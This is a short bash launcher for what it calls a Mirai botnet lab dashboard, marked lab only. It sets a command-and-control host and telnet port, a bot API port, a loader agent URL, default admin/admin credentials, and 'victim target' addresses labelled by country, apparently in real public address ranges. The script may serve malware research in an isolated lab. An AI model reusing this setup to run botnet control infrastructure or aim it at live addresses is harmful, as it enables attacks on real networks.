#!/usr/bin/env bash
# Start Mirai Lab Dashboard v2 on C2 (lab only)
set -euo pipefail
cd "$(dirname "$0")/backend"

if [[ ! -f .venv/bin/activate ]]; then
  rm -rf .venv
  python3 -m venv .venv
  # shellcheck disable=SC1091
  source .venv/bin/activate
  pip install -U pip
  pip install -r requirements.txt
else
  # shellcheck disable=SC1091
  source .venv/bin/activate
fi

export CNC_HOST="${CNC_HOST:-${LAB_C2_IP:-185.10.20.100}}"
export CNC_PORT="${CNC_PORT:-23}"
export CNC_API_PORT="${CNC_API_PORT:-9090}"
export CNC_USER="${CNC_USER:-admin}"
export CNC_PASS="${CNC_PASS:-admin}"
export DASH_PORT="${DASH_PORT:-8080}"
export LAB_TOKEN="${LAB_TOKEN:-lab-only}"
export LOADER_AGENT_URL="${LOADER_AGENT_URL:-http://185.10.20.200:9090}"
export LAB_C2_IP="${LAB_C2_IP:-185.10.20.100}"
export LAB_LOADER_IP="${LAB_LOADER_IP:-185.10.20.200}"
# v2 victim targets (override with env if subnets differ)
export LAB_TARGET_US="${LAB_TARGET_US:-12.1.2.100}"
export LAB_TARGET_CN="${LAB_TARGET_CN:-202.97.0.100}"
export LAB_TARGET_RU="${LAB_TARGET_RU:-217.107.0.100}"
export LAB_TARGET_KP="${LAB_TARGET_KP:-175.45.176.100}"
export LAB_TARGET_IR="${LAB_TARGET_IR:-5.200.0.100}"

echo "[dashboard-v2] CNC ${CNC_HOST}:${CNC_PORT}  Bot HTTP API :${CNC_API_PORT}  UI :${DASH_PORT}"
echo "[dashboard-v2] Loader agent ${LOADER_AGENT_URL}"
exec python3 app.py
